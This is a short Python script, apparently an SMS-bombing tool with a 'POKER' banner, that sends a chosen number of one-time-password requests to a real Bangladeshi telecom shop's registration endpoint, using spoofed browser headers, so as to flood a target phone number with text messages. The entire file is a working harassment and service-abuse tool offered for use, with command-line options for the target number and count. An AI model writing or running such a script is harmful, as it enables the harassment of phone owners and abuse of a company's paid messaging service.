import requests
import argparse
from colorama import Fore, Back, Style

print(f"{Fore.RED}[̲̅P]{Fore.YELLOW}[̲̅O]{Fore.RED}[̲̅K]{Fore.YELLOW}[̲̅E]{Fore.RED}[̲̅R]{Fore.RESET}")

def send_otp(number):
    endpoint = "https://eshop.banglalink.net:443/wp-admin/admin-ajax.php"
    headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "Accept": "application/json, text/javascript, */*; q=0.01", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": "https://eshop.banglalink.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://eshop.banglalink.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Connection": "close"}
    data = {"action": "otpRegistration", "otpMobile": number}
    resp = requests.post(endpoint, headers=headers, data=data)
    if "Customer OTP Successfully" in resp.text:
        print("Otp Send  "+number)
    else:
        print("Failed "+number)

def main(num=10, number="1234"):
    num = int(num)
    for n in range(num):
        send_otp(number)


parser = argparse.ArgumentParser(description="Sends Mass OTP")
parser.add_argument("-c","--count", help="enter number of otp")
parser.add_argument("-m","--mobile", help="Enter target number", required=True)
args = parser.parse_args()
if args.count:
    main(args.count, args.mobile)
else:
    print("Enter -h to show help menu")
